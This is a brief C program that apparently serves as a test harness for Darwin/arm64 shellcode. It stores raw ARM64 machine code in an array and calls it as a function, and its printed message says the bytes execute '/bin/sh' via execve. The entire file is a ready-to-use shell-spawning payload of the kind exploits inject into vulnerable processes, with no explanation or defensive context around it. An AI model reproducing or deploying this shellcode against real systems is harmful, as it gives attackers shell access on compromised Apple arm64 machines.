#include <stdio.h>
#include <string.h>
char hellcode[]=
"\xe1\x45\x8c\xd2"
"\x21\xcd\xad\xf2"
"\xe1\x65\xce\xf2"
"\x01\x0d\xe0\xf2"
"\xe1\x83\x1f\xf8"
"\x01\x01\x80\xd2"
"\xe0\x63\x21\xcb"
"\xe1\x03\x1f\xaa"
"\xe2\x03\x1f\xaa"
"\x70\x07\x80\xd2"
"\xe1\x66\x02\xd4"
;
int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte execve(\"/bin/sh\",0,0); Darwin/arm64 by ___\n",
         (int)strlen(hellcode));
  shell();
  return 0;
}

